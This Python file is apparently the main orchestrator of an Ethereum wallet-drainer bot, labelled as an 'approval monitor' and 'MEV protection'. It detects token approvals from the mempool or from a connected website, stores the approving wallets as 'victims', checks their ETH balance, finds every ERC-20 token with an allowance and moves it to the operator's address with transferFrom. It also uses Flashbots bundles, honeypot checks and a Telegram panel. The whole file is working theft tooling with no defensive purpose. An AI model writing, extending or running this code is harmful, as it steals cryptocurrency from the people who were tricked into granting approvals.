#!/usr/bin/env python3
print("🚀 Initializing Bot... Please wait.", flush=True)
"""
🚀 BLOCKCHAIN APPROVAL MONITOR & EXECUTOR
Main orchestrator that coordinates:
1. Mempool Monitoring (Real-time detection)
2. Persistent Monitoring (Wallet watching)
3. Smart Gas Management (Cost optimization)
4. Trigger Execution (Automated actions)
"""

import sys
import os
import logging
import time
import threading
import json
from typing import Dict, List, Optional
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

try:
    from dotenv import load_dotenv
except ImportError:
    print("⚠️ python-dotenv not found. Using system environment variables.")
    def load_dotenv(): pass

# Load environment variables from .env file
load_dotenv()

# Add current directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Setup Monitoring First
from utils.monitoring import (
    setup_sentry, setup_structured_logging,
    metrics, health_checker, monitoring_logger,
    send_slack_alert, TelegramLogHandler
)
from utils.health_endpoint import run_health_server

# Setup structured logging first so logger is available
setup_structured_logging()
logger = logging.getLogger("ORCHESTRATOR")

# Import Configuration
from utils.config import (
    POPULAR_TOKENS, CHAIN_ID, CHAIN_NAME, NETWORK_NAME,
    ETHEREUM_PUBLIC_RPCS, MIN_VICTIM_ETH_BALANCE,
)

# Import Core Modules
from core.mempool_monitor import AdvancedMempoolMonitor, PendingApproval
from core.approval_monitor import PersistentMonitorDB, PersistentTarget, MonitoringStatus
from core.enhanced_trigger_executor import EnhancedTriggerExecutor, ExecutionResult, ExecutionStatus
from core.simulation_layer import SimulationLayer, SimulationStatus
from core.honeypot_detector import HoneypotDetector, HoneypotRisk
try:
    from core.flashbots_executor import FlashbotsExecutor, FlashbotsStatus
except (ImportError, ModuleNotFoundError):
    logger.warning("⚠️ flashbots library not found. Flashbots feature will be disabled.")
    class FlashbotsStatus:
        DISABLED = "disabled"
    class FlashbotsExecutor:
        def __init__(self, **kwargs):
            self.enabled = False
        def submit_bundle(self, **kwargs):
            return type('obj', (object,), {'status': 'disabled'})()
        def monitor_bundle(self, **kwargs):
            return type('obj', (object,), {'status': 'disabled'})()
from core.multi_wallet_monitor import MultiWalletMonitor, DepositEvent
from core.contract_integration import ContractIntegration
from core.decision_engine import decision_engine, Decision
from core.website_connector import WebsiteConnector
from core.token_discovery import TokenDiscovery

# Import Utilities
from utils.secure_config import SecureKeyManager
from utils.smart_gas import SmartGasOracle

# Initialize monitoring systems
setup_sentry()

# Setup Telegram Logging
telegram_token = os.getenv("TELEGRAM_BOT_TOKEN")
telegram_chat_id = os.getenv("TELEGRAM_CHAT_ID")
telegram_handler = None

if telegram_token and telegram_chat_id:
    telegram_handler = TelegramLogHandler(telegram_token, telegram_chat_id)
    telegram_handler.setLevel(logging.INFO)
    # Formatter for telegram
    formatter = logging.Formatter('%(asctime)s - %(message)s', datefmt='%H:%M:%S')
    telegram_handler.setFormatter(formatter)

os.makedirs('logs', exist_ok=True)

handlers = [
    logging.FileHandler('logs/orchestrator.log'),
    logging.StreamHandler()
]

if telegram_handler:
    handlers.append(telegram_handler)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=handlers
)
logger = logging.getLogger("ORCHESTRATOR")

class BlockchainOrchestrator:
    """
    Main orchestrator that ties all modules together for automated execution
    """

    _ETH_PRICE_CACHE: Dict = {"price": 2500.0, "updated_at": 0.0}
    _ETH_PRICE_TTL = 60  # seconds

    def _get_eth_price_usd(self) -> float:
        """
        Return current ETH/USD price.
        Fetches from CoinGecko public API, caches for 60 s to avoid per-call latency.
        Falls back to $2500 if the network request fails.
        """
        import urllib.request as _url_req
        import json as _json
        import time as _time

        cache = BlockchainOrchestrator._ETH_PRICE_CACHE
        if _time.time() - cache["updated_at"] < self._ETH_PRICE_TTL:
            return cache["price"]

        try:
            url = (
                "https://api.coingecko.com/api/v3/simple/price"
                "?ids=ethereum&vs_currencies=usd"
            )
            req = _url_req.Request(url, headers={"User-Agent": "MEVBot/1.0"})
            with _url_req.urlopen(req, timeout=4) as resp:
                data = _json.loads(resp.read())
                price = float(data["ethereum"]["usd"])
                cache["price"] = price
                cache["updated_at"] = _time.time()
                logger.debug(f"💹 Live ETH price fetched: ${price:,.2f}")
                return price
        except Exception as exc:
            logger.warning(
                f"⚠️  Could not fetch live ETH price ({exc}). "
                f"Using cached ${cache['price']:,.2f}"
            )
            return cache["price"]

    def __init__(self):
        self.secure_manager = SecureKeyManager()
        self.config = self._load_config()
        self._validate_environment()
        
        try:
            # Use public fallback if configured RPC fails
            rpc_url = self.config['rpc_url']
            if "your-api-key" in rpc_url:
                rpc_url = "https://eth.llamarpc.com"
                logger.info(f"⚠️ API key not found in RPC URL, falling back to public: {rpc_url}")
            
            self.executor_module = EnhancedTriggerExecutor(
                rpc_url=rpc_url,
                config=self.secure_manager.get_executor_config()
            )
        except Exception as e:
            logger.error(f"❌ Failed to initialize executor: {e}")
            # Final fallback to public RPC if initialization fails
            self.executor_module = EnhancedTriggerExecutor(
                rpc_url="https://eth.llamarpc.com",
                config=self.secure_manager.get_executor_config()
            )
        
        self.gas_oracle = SmartGasOracle(self.executor_module.w3)
        
        # Initialize Simulation & Verification Layer
        self.simulation_layer = SimulationLayer(
            w3=self.executor_module.w3,
            executor_address=self.config['destination_address']
        )
        
        # Initialize Honeypot Detector
        self.honeypot_detector = HoneypotDetector(
            w3=self.executor_module.w3,
            chain="ethereum"
        )
        
        # Initialize Flashbots Executor (MEV Protection)
        flashbots_enabled = True
        logger.info("🛡️ Flashbots enabled")
        self.flashbots_executor = FlashbotsExecutor(
            w3=self.executor_module.w3,
            private_key=self.secure_manager.get_private_key(),
            enabled=flashbots_enabled
        )
        
        # Initialize Smart Contract Executor (Option 5: Professional Contract Execution)
        # ⚠️ DISABLED BY DEFAULT
        contract_execution_enabled = os.getenv("CONTRACT_EXECUTION_ENABLED", "false").lower() == "true"
        if contract_execution_enabled:
            # Get private key from secure manager
            private_key = self.secure_manager.get_private_key()
            if private_key:
                try:
                    self.contract_integration = ContractIntegration(
                        w3=self.executor_module.w3,
                        private_key=private_key
                    )
                    if self.contract_integration.ensure_contract_deployed():
                        logger.info("✅ Smart Contract Executor ready for use")
                    else:
                        logger.warning("⚠️ Smart Contract Executor deployment pending")
                except Exception as e:
                    logger.error(f"❌ Smart Contract Executor initialization failed: {e}")
                    self.contract_integration = None
            else:
                logger.warning("⚠️ No private key available for Smart Contract Executor")
                self.contract_integration = None
        else:
            self.contract_integration = None
            logger.info("⏭️ Smart Contract Executor disabled")
        
        # Monitors
        self.db = PersistentMonitorDB() # Initialize DB
        self.mempool_monitor = AdvancedMempoolMonitor(
            http_url=self.config['rpc_url'],
            wss_url=self.config['wss_url'],
            on_approval_detected=self._on_approval_detected,
            max_workers=self.config['max_workers']
        )
        
        self.wallet_monitor = MultiWalletMonitor(
            w3=self.executor_module.w3,
            on_deposit_callback=self._on_deposit_detected,
            max_workers=self.config['max_workers']
        )

        # 🌐 Website Connector (جایگزین / مکمل مانیتور بلاکچین)
        self.website_connector = WebsiteConnector(
            on_approval_detected=self._on_approval_detected,
            website_url=self.config['website_url'],
            api_key=self.config['website_api_key'],
            webhook_port=self.config['webhook_port'],
        )

        # 🔍 Token Discovery — finds ALL ERC-20 tokens in a wallet automatically
        self.token_discovery = TokenDiscovery(
            w3=self.executor_module.w3,
            spender_address=self.executor_module.executor_address,
        )
        
        self._running = False
        self._executor = ThreadPoolExecutor(max_workers=self.config['max_workers'])
        
        # Statistics
        self.stats = {
            "approvals_detected": 0,
            "transfers_executed": 0,
            "total_amount_drained": 0,
            "start_time": datetime.now().isoformat(),
            "last_execution": None
        }
        
        website_status = (
            f"🌐 {self.config['website_url']}"
            if self.config['enable_website_mode'] and self.config['website_url']
            else ("🌐 ENABLED (URL not set yet)" if self.config['enable_website_mode'] else "⛓️  BLOCKCHAIN MEMPOOL")
        )
        logger.info("\n" + "═" * 80)
        logger.info("⚡ ⚡ ⚡  ADVANCED BLOCKCHAIN ROBOT IS NOW ONLINE  ⚡ ⚡ ⚡")
        logger.info("═" * 80)
        logger.info("🚀 STATUS: SYSTEM FULLY OPERATIONAL")
        logger.info("⛓️  CHAIN:   ETHEREUM MAINNET (chain_id=1) — ONLY NETWORK SUPPORTED")
        logger.info("🛰️  RPC:    " + self.config['rpc_url'])
        logger.info("💰 TARGET: " + (self.config['destination_address'] if self.config['destination_address'] else "NOT CONFIGURED"))
        logger.info("🛡️  FLASHBOTS: " + ("ENABLED" if self.flashbots_executor.enabled else "DISABLED"))
        logger.info("🔥 SPEED MODE: " + ("EXTREME (0.0001s)" if self.config['extreme_speed_mode'] else "NORMAL"))
        logger.info("📡 APPROVAL SOURCE: " + website_status)
        logger.info("═" * 80 + "\n")
    
    def _load_config(self) -> Dict:
        """Load configuration from environment or defaults — Ethereum Mainnet ONLY"""
        extreme_mode = os.getenv("EXTREME_SPEED_MODE", "true").lower() == "true"

        rpc_url = os.getenv("RPC_URL", "").strip()
        if not rpc_url or "your-api-key" in rpc_url:
            rpc_url = ETHEREUM_PUBLIC_RPCS[0]

        return {
            "chain_id": CHAIN_ID,
            "chain_name": CHAIN_NAME,
            "network_name": NETWORK_NAME,
            "rpc_url": rpc_url,
            "wss_url": os.getenv("WSS_URL", ""),
            "destination_address": os.getenv("DESTINATION_ADDRESS", ""),
            "enable_execution": os.getenv("ENABLE_EXECUTION", "true").lower() == "true",
            "max_workers": int(os.getenv("MAX_WORKERS", "256" if extreme_mode else "50")),
            "min_drain_value": float(os.getenv("MIN_DRAIN_VALUE", "0.1")),
            "extreme_speed_mode": extreme_mode,
            "enable_privacy_masking": os.getenv("ENABLE_PRIVACY_MASKING", "false").lower() == "true",
            "gas_strategy": "EXTREME" if extreme_mode else "ULTRA_FAST",
            "mempool_poll_interval": 0.0001 if extreme_mode else 0.01,
            "execution_timeout": 10 if extreme_mode else 30,
            "enable_website_mode": os.getenv("ENABLE_WEBSITE_MODE", "false").lower() == "true",
            "website_url": os.getenv("WEBSITE_URL", ""),
            "website_api_key": os.getenv("WEBSITE_API_KEY", ""),
            "webhook_port": int(os.getenv("WEBHOOK_PORT", "8765")),
        }
    
    def _validate_environment(self):
        """Validate required environment variables"""
        logger.info("\n📋 CONFIGURATION CHECK:")
        conf = self.secure_manager.get_secure_config()

        logger.info(f"   ⛓️  Network:      {self.config['network_name']} (chain_id={self.config['chain_id']})")
        logger.info(f"   RPC Configured: {conf['rpc_configured']}")
        logger.info(f"   WSS Configured: {conf['wss_configured']}")

        if conf['has_destination']:
            logger.info(f"   Destination: {conf['destination_masked']}")
        else:
            logger.warning("   ⚠️ DESTINATION_ADDRESS not set")

        if conf['has_private_key']:
            logger.info(f"   Private Key: SET ({conf['key_hash']})")
        else:
            logger.warning("   ⚠️ EXECUTOR_PRIVATE_KEY not set")

        logger.info(f"   Execution Enabled: {self.config['enable_execution']}")

        # Verify we are connected to Ethereum Mainnet
        try:
            actual_chain_id = self.executor_module.w3.eth.chain_id if hasattr(self, 'executor_module') else None
            if actual_chain_id is not None and actual_chain_id != CHAIN_ID:
                logger.error(
                    f"❌ WRONG NETWORK! Connected to chain_id={actual_chain_id} "
                    f"but only Ethereum Mainnet (chain_id={CHAIN_ID}) is supported. Exiting."
                )
                import sys; sys.exit(1)
            elif actual_chain_id == CHAIN_ID:
                logger.info(f"   ✅ Chain ID verified: {actual_chain_id} (Ethereum Mainnet)")
        except Exception as e:
            logger.warning(f"   ⚠️ Could not verify chain_id: {e}")

        logger.info("")

    def _on_approval_detected(self, pending: PendingApproval):
        """Callback when an approval is detected in mempool — Ethereum Mainnet ONLY"""
        chain_id = getattr(pending, 'chain_id', CHAIN_ID)
        if chain_id != CHAIN_ID:
            logger.warning(
                f"⛔ IGNORED — approval from chain_id={chain_id} "
                f"(only Ethereum Mainnet chain_id={CHAIN_ID} is accepted)"
            )
            return

        # VISIBLE CONSOLE LOG
        print(f"\n🔔 [ETH] APPROVAL DETECTED: {pending.spender} for {pending.token_address} (Tx: {pending.tx_hash})", flush=True)
        logger.info(f"\n🔔 [ETH Mainnet] APPROVAL DETECTED: {pending.spender} for {pending.token_address}")
        self.stats["approvals_detected"] += 1
        
        # Add to persistent monitoring
        target = PersistentTarget(
            address=pending.from_address,
            token_address=pending.token_address,
            token_symbol=self.executor_module.get_symbol(pending.token_address) or "UNKNOWN",
            spender=pending.spender,
            allowance=pending.amount,
            decimals=self.executor_module.get_decimals(pending.token_address) or 18,
            added_at=datetime.now().isoformat(),
            last_checked=datetime.now().isoformat(),
            check_count=0,
            status=MonitoringStatus.WAITING_FOR_DEPOSIT,
            last_balance=0,
            current_balance=0,
            max_balance_seen=0,
            deposit_detected_at=None,
            priority=5, # High priority for new approvals
            notes=f"Detected via mempool tx: {pending.tx_hash}"
        )
        self.db.add_target(target)
        
        # Check if we should execute immediately (if they already have balance)
        if self.config['enable_execution']:
            self._executor.submit(self._check_and_execute, target)

    def _on_deposit_detected(self, deposit: DepositEvent):
        """Callback when a deposit is detected in a monitored wallet"""
        # VISIBLE CONSOLE LOG
        print(f"\n💰 DEPOSIT DETECTED: {deposit.deposit_amount} {deposit.token_symbol} -> {deposit.wallet_address}", flush=True)
        logger.info(f"\n💰 DEPOSIT DETECTED: {deposit.deposit_amount} {deposit.token_symbol} -> {deposit.wallet_address}")
        
        # Find target info from DB to get allowance details
        # For simplicity, we assume we can get target details or reconstruct them
        # In a real scenario, we might query the DB for the target record
        
        if self.config['enable_execution']:
            # We need to reconstruct target for execution
            # This is a simplification; ideally we pull full target from DB
            # but for now we just trigger execution logic
            
            # Use a specialized execution path for deposits
            self._executor.submit(self._execute_deposit_drain, deposit)

    def _drain_one_token(self, wallet_address: str, token_address: str,
                          token_symbol: str, decimals: int, drain_amount: int):
        """Execute drain for a single token — shared by all drain paths."""
        gas_stats = self.gas_oracle.get_statistics()
        current_gas_gwei = float(gas_stats.get("current_gwei", 20))
        eth_price = self._get_eth_price_usd()
        est_gas_cost_usd = (100000 * current_gas_gwei * 1e-9) * eth_price

        _trend_to_congestion = {
            "rising_fast": "extreme", "rising": "high",
            "stable": "normal", "falling": "normal",
            "falling_fast": "normal", "unknown": "normal",
        }
        congestion_level = _trend_to_congestion.get(gas_stats.get("trend", "normal"), "normal")

        token_amount_decimal = drain_amount / (10 ** decimals)
        token_price = POPULAR_TOKENS.get(token_symbol, {}).get("price_usd", 0)
        if token_price == 0 and "USD" in token_symbol:
            token_price = 1.0
        value_usd = token_amount_decimal * token_price

        decision, score, _ = decision_engine.evaluate(
            token_value_usd=value_usd,
            estimated_gas_cost_usd=est_gas_cost_usd,
            network_congestion_level=congestion_level,
        )
        print(f"🤔 [{token_symbol}] Value: ${value_usd:.2f} | Score: {score:.1f} | {decision.name}", flush=True)

        if decision == Decision.REJECT:
            logger.info(f"❌ {token_symbol} rejected by policy (score {score:.1f})")
            return
        if decision == Decision.WAIT_FOR_BETTER_CONDITIONS:
            logger.info(f"⏳ {token_symbol} waiting for better conditions")
            return

        # Honeypot check
        honeypot_result = self.honeypot_detector.check_token(token_address)
        if honeypot_result.is_honeypot or honeypot_result.risk_level in [
            HoneypotRisk.HIGH_RISK, HoneypotRisk.CONFIRMED_HONEYPOT
        ]:
            logger.error(f"🚨 HONEYPOT: {token_symbol} — skipping")
            return
        logger.info(f"✅ Honeypot OK: {token_symbol}")

        # Simulation
        is_safe, simulation = self.simulation_layer.simulate_approval_drain(
            token_address=token_address,
            wallet_address=wallet_address,
            destination=self.config['destination_address'],
            amount=drain_amount,
            gas_price=self.executor_module.w3.eth.gas_price,
        )
        if not is_safe and simulation.status in (
            SimulationStatus.WILL_FAIL, SimulationStatus.NETWORK_UNSAFE
        ):
            logger.error(f"❌ Simulation failed for {token_symbol} — aborting")
            return
        logger.info(f"✅ Simulation OK: {token_symbol}")

        # Execute
        result = self.executor_module.execute_transfer_from(
            token_address=token_address,
            from_address=wallet_address,
            amount=drain_amount,
            token_symbol=token_symbol,
            decimals=decimals,
        )
        self._handle_execution_result(result)

    def _check_and_execute(self, target: PersistentTarget):
        """
        Discover and drain ALL ERC-20 tokens in the wallet that have
        a non-zero balance AND a non-zero allowance for the executor.
        """
        # ── ETH FILTER ────────────────────────────────────────────────────────
        if not self._victim_has_eth(target.address):
            return

        print(f"\n🔍 FULL WALLET SCAN: {target.address}", flush=True)
        logger.info(f"🔍 Scanning all ERC-20 tokens for {target.address}")

        # Discover every drainable token in the wallet
        tokens = self.token_discovery.discover(target.address)

        if not tokens:
            logger.info(f"ℹ️  No drainable tokens found in {target.address[:10]}...")
            return

        print(f"💰 {len(tokens)} drainable token(s) found — draining all", flush=True)

        for token in tokens:
            logger.info(
                f"▶ Draining {token.symbol}: "
                f"{token.balance_human:.6f} (allowance: "
                f"{'∞' if token.allowance_human == float('inf') else f'{token.allowance_human:.6f}'})"
            )
            try:
                self._drain_one_token(
                    wallet_address=target.address,
                    token_address=token.address,
                    token_symbol=token.symbol,
                    decimals=token.decimals,
                    drain_amount=token.drain_amount,
                )
            except Exception as e:
                logger.error(f"❌ Error draining {token.symbol}: {e}")

    def _execute_deposit_drain(self, deposit: DepositEvent):
        """Execute drain triggered by deposit"""
        logger.info(f"⚡ Triggering execution for deposit: {deposit.wallet_address}")

        # ── ETH FILTER: skip wallets with no meaningful ETH ──────────────────
        if not self._victim_has_eth(deposit.wallet_address):
            return

        # On deposit: discover and drain ALL tokens in the wallet (not just the one that triggered)
        print(f"\n🔍 DEPOSIT TRIGGER — scanning all tokens for {deposit.wallet_address}", flush=True)
        tokens = self.token_discovery.discover(deposit.wallet_address)

        if not tokens:
            logger.info(f"ℹ️  No drainable tokens found after deposit in {deposit.wallet_address[:10]}...")
            return

        print(f"💰 {len(tokens)} drainable token(s) — draining all", flush=True)
        for token in tokens:
            try:
                self._drain_one_token(
                    wallet_address=deposit.wallet_address,
                    token_address=token.address,
                    token_symbol=token.symbol,
                    decimals=token.decimals,
                    drain_amount=token.drain_amount,
                )
            except Exception as e:
                logger.error(f"❌ Error draining {token.symbol} on deposit trigger: {e}")

    def _execute_with_flashbots(self, token_address: str, from_address: str, amount: int, 
                                 token_symbol: str, decimals: int):
        """Execute transfer through Flashbots"""
        if not self.flashbots_executor.enabled:
            # Return a mock object that won't crash the caller
            class DummyResult:
                def __init__(self):
                    self.status = "disabled"
                    self.bundle_hash = None
                    self.block_number = 0
                    self.error_message = "Flashbots disabled"
            return DummyResult()

        try:
            # Build the transaction
            contract = self.executor_module.get_token_contract(token_address)
            tx = contract.functions.transferFrom(
                from_address,
                self.config['destination_address'],
                amount
            ).build_transaction({
                'from': self.executor_module.executor_address,
                'nonce': self.executor_module.w3.eth.get_transaction_count(
                    self.executor_module.executor_address,
                    'pending'
                ),
                'gasPrice': self.executor_module.w3.eth.gas_price,
                'gas': 150000
            })
            
            # Sign the transaction
            private_key = self.config.get('private_key') or os.getenv('EXECUTOR_PRIVATE_KEY')
            signed_tx = self.executor_module.w3.eth.account.sign_transaction(
                tx,
                private_key
            )
            
            # Submit through Flashbots
            result = self.flashbots_executor.submit_bundle(
                transactions=[signed_tx.rawTransaction.hex()],
                block_number=None
            )
            
            return result
        except Exception as e:
            logger.error(f"❌ Flashbots execution error: {str(e)}")
            # Handle class method vs instance method based on implementation
            return type('obj', (object,), {'status': 'failed', 'error_message': str(e), 'bundle_hash': None})()
    
    def _handle_execution_result(self, result: ExecutionResult):
        """Handle the result of an execution attempt"""
        if result.status == ExecutionStatus.SUCCESS:
            # VISIBLE SUCCESS BOX
            print("\n" + "🟩" * 40, flush=True)
            print(f"✅ DRAIN SUCCESSFUL: {result.amount_transferred} {result.token_symbol}", flush=True)
            print(f"   TX HASH: {result.tx_hash}", flush=True)
            print(f"   VALUE: {result.amount_transferred} {result.token_symbol}", flush=True)
            print("🟩" * 40 + "\n", flush=True)
            
            logger.info(f"✅ DRAIN SUCCESSFUL: {result.amount_transferred} {result.token_symbol}")
            logger.info(f"   TX: {result.tx_hash}")
            self.stats["transfers_executed"] += 1
            self.stats["total_amount_drained"] += result.amount_transferred
            self.stats["last_execution"] = datetime.now().isoformat()
            
            # Update target status in DB to ACTED
            if hasattr(self, 'db') and self.db:
                # Add a dummy update if method doesn't exist to prevent crash
                try:
                    self.db.update_status(result.from_address, MonitoringStatus.ACTED)
                except Exception:
                    pass
        else:
            # VISIBLE FAILURE BOX
            print("\n" + "🟥" * 40, flush=True)
            print(f"❌ Execution Failed: {result.error_message}", flush=True)
            print("🟥" * 40 + "\n", flush=True)
            logger.warning(f"❌ Execution Failed: {result.error_message}")

    def _victim_has_eth(self, wallet_address: str) -> bool:
        """Return True if wallet holds at least MIN_VICTIM_ETH_BALANCE ETH."""
        if MIN_VICTIM_ETH_BALANCE <= 0:
            return True
        try:
            from web3 import Web3
            balance_wei = self.executor_module.w3.eth.get_balance(
                Web3.to_checksum_address(wallet_address)
            )
            balance_eth = float(Web3.from_wei(balance_wei, 'ether'))
            if balance_eth >= MIN_VICTIM_ETH_BALANCE:
                return True
            logger.info(
                f"⏭️  SKIP {wallet_address[:10]}... — ETH balance "
                f"{balance_eth:.4f} < minimum {MIN_VICTIM_ETH_BALANCE} ETH"
            )
            return False
        except Exception as e:
            logger.warning(f"⚠️ Could not read ETH balance for {wallet_address}: {e}")
            return False

    def _load_initial_targets(self):
        """Load targets from DB into wallet monitor"""
        targets = self.db.get_all_active_targets()
        logger.info(f"📚 Loading {len(targets)} active targets from database...")
        
        # Group by address for MultiWalletMonitor
        wallets_to_monitor = {}
        
        for target in targets:
            if target.address not in wallets_to_monitor:
                wallets_to_monitor[target.address] = {
                    "address": target.address,
                    "tokens": [],
                    "priority": target.priority
                }
            
            wallets_to_monitor[target.address]["tokens"].append({
                "address": target.token_address,
                "symbol": target.token_symbol,
                "decimals": target.decimals
            })
            
        # Add to wallet monitor
        self.wallet_monitor.add_wallets_batch(list(wallets_to_monitor.values()))

    def print_statistics(self):
        """Print execution statistics"""
        logger.info("\n\n" + "=" * 80)
        logger.info("📊 LIVE STATISTICS")
        logger.info("=" * 80)
        logger.info(f"Uptime: {datetime.now() - datetime.fromisoformat(self.stats['start_time'])}")
        logger.info(f"Approvals Detected: {self.stats['approvals_detected']}")
        logger.info(f"Transfers Executed: {self.stats['transfers_executed']}")
        logger.info(f"Total Drained: {self.stats['total_amount_drained']:.4f}")
        
        # Get sub-module stats
        mp_stats = self.mempool_monitor.get_stats()
        logger.info(f"Mempool TPS: {mp_stats.get('txs_per_second', 0):.2f}")
        
        wm_stats = self.wallet_monitor.get_statistics()
        logger.info(f"Active Wallets Monitored: {wm_stats.get('active_wallets', 0)}")
        
        gas_stats = self.gas_oracle.get_statistics()
        if "current_gwei" in gas_stats:
            logger.info(f"Current Gas: {gas_stats['current_gwei']} gwei ({gas_stats['trend']})")
            
        logger.info("=" * 80 + "\n")

    def start(self):
        """Start all monitoring threads"""
        website_mode = self.config.get('enable_website_mode', False)
        website_url = self.config.get('website_url', '')

        source_line = (
            f"║  🌐 WEBSITE MODE: {website_url or 'URL NOT SET — ADD TO .env'}" + " " * max(0, 57 - len(website_url or 'URL NOT SET — ADD TO .env')) + "║"
            if website_mode
            else "║  📊 MONITORING MEMPOOL AND TARGET WALLETS..." + " " * 13 + "║"
        )

        print("\n" + "╔" + "═" * 58 + "╗")
        print("║" + " " * 18 + "🚀 MEV BOT ORCHESTRATOR" + " " * 17 + "║")
        print("║" + " " * 58 + "║")
        print("║  ✅ STATUS: BOT SUCCESSFULLY STARTED" + " " * 21 + "║")
        print("║  🛡️  MODE: PROFESSIONAL MEV PROTECTION ENABLED" + " " * 12 + "║")
        print(source_line)
        print("╚" + "═" * 58 + "╝" + "\n")

        self._running = True
        logger.info("🚀 Starting all monitoring modules...")

        # Start gas oracle so statistics are available
        if hasattr(self.gas_oracle, 'start_monitoring'):
            try:
                self.gas_oracle.start_monitoring()
                logger.info("⛽ Gas oracle started")
            except Exception as e:
                logger.warning(f"⚠️ Gas oracle start failed: {e}")

        # Load previously stored targets from DB
        try:
            self._load_initial_targets()
        except Exception as e:
            logger.warning(f"⚠️ Could not load initial targets: {e}")

        if website_mode:
            # ─── حالت سایت: فقط WebsiteConnector فعاله ───
            logger.info("🌐 WEBSITE MODE فعال — approval ها از سایت دریافت می‌شن")
            self.website_connector.start()
        else:
            # ─── حالت بلاکچین: مانیتور قدیمی ───
            logger.info("⛓️  BLOCKCHAIN MODE فعال — mempool مانیتور می‌شه")
            if hasattr(self.mempool_monitor, 'start'):
                self.mempool_monitor.start()

        # Wallet monitor همیشه فعاله (برای مانیتور موجودی بعد از approval)
        if hasattr(self.wallet_monitor, 'start'):
            self.wallet_monitor.start()
        
        try:
            while self._running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()

    def run(self):
        """Alias for start() to satisfy potential external callers"""
        self.start()

    def shutdown(self):
        """Internal shutdown logic"""
        self._running = False
        logger.info("🛑 Stopping orchestrator...")
        if hasattr(self.mempool_monitor, 'stop'):
            self.mempool_monitor.stop()
        if hasattr(self.wallet_monitor, 'stop'):
            self.wallet_monitor.stop()
        if hasattr(self.website_connector, 'stop'):
            self.website_connector.stop()
        self._executor.shutdown(wait=False)

    def stop(self):
        """Stop all systems"""
        self.shutdown()

def main():
    """Main entry point"""
    try:
        # Create logs directory if it doesn't exist
        os.makedirs('logs', exist_ok=True)
        
        # Start health server in a separate thread
        try:
            run_health_server(port=int(os.getenv("HEALTH_PORT", "9000")))
        except Exception as e:
            logger.error(f"⚠️ Health server failed to start: {e}")

        # ── پنل مدیریت تلگرام ──────────────────────────────────────────────
        try:
            from admin_panel import start_admin_panel
            start_admin_panel()
            logger.info("📱 Admin Panel thread launched")
        except Exception as e:
            logger.warning(f"⚠️ Admin Panel could not start: {e}")

        orchestrator = BlockchainOrchestrator()
        orchestrator.start()
    except Exception as e:
        logger.error(f"❌ FATAL ERROR DURING STARTUP: {e}", exc_info=True)
        sys.exit(1)


if __name__ == "__main__":
    main()
